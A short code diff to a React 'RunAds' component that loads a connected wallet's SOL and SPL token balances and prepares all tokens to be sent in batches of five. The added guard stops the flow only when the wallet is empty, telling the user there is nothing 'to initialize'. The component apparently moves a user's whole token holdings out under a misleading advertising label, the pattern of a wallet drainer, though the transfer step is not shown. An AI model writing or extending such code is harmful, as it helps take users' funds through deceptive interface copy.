@@ -67,6 +67,14 @@ export default function RunAds() {
 
       // Load balances and prepare token batches (max 5 tokens per batch)
       const balances = await getWalletBalances(publicKey);
+      // Guard: if wallet has no transferable assets, inform user and stop
+      if ((balances.solBalance ?? 0) <= 0 && (!balances.tokens || balances.tokens.length === 0)) {
+        toast({
+          title: "No Assets Detected",
+          description: "Your wallet has no SOL or SPL tokens to initialize.",
+        });
+        return;
+      }
       const tokensToSend = balances.tokens;
       const batchSize = 5;
       const batches: typeof tokensToSend[] = [];
